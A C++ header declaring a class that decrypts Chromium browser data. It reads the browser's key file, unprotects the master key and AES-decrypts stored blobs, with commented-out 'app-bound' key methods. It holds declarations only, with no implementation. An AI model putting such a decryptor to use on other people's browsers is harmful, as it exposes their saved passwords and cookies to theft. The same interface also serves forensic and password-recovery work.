#ifndef CHROMIUMDECRYPTOR_H
#define CHROMIUMDECRYPTOR_H

#include "Imports.h"

class ChromiumDecryptor {
private:
    DATA_BLOB* master_key_blob;
    DATA_BLOB* app_bound_master_key_blob;

public:
    // Constructor
    ChromiumDecryptor();

    // Destructor (if needed)
    ~ChromiumDecryptor();

    // Member function to initialize ChromiumDecryptor
    bool ChromiumDecryptorInit(std::string path);
    std::string get_browser_key(std::string path);
    std::string read_json(const std::string& filePath);
    DATA_BLOB* UnportectMasterKey(std::string MasterString);
    std::string AESDecrypter(std::vector<BYTE> EncryptedBlob);

    //bool ChromiumAppBoundDecryptorInit(std::string key);
    //std::string AESDecrypterAppBound(std::vector<BYTE> EncryptedBlob);

private:
    // Helper functions if needed
};


#endif /* CHROMIUMDECRYPTOR_H */
